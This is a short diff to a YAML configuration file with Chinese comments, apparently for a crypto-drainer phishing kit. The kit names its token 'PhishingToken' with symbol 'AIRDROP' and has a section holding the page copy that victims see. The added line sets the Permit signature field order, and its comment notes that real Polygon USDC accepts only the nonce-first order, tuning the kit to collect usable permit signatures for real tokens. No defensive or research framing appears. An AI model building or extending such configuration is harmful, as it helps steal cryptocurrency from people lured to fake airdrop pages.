@@ -22,6 +22,7 @@ token:
   name: "PhishingToken"          # ⚠ 必须与合约 permit 的 EIP-712 domain.name 一字不差
   symbol: "AIRDROP"
   permit_version: "1"            # permit EIP-712 domain.version;真实主网代币各异(如 Polygon USDC 为 "2"),用 DOMAIN_SEPARATOR 实测
+  permit_order: "deadline_first" # Permit 结构字段顺序:deadline_first=EIP-2612 标准 / nonce_first=Circle 系 USDC(实测 Polygon USDC 仅认后者)
 
 # 钓鱼页面包装(受害者看到的一切文案)
 site:
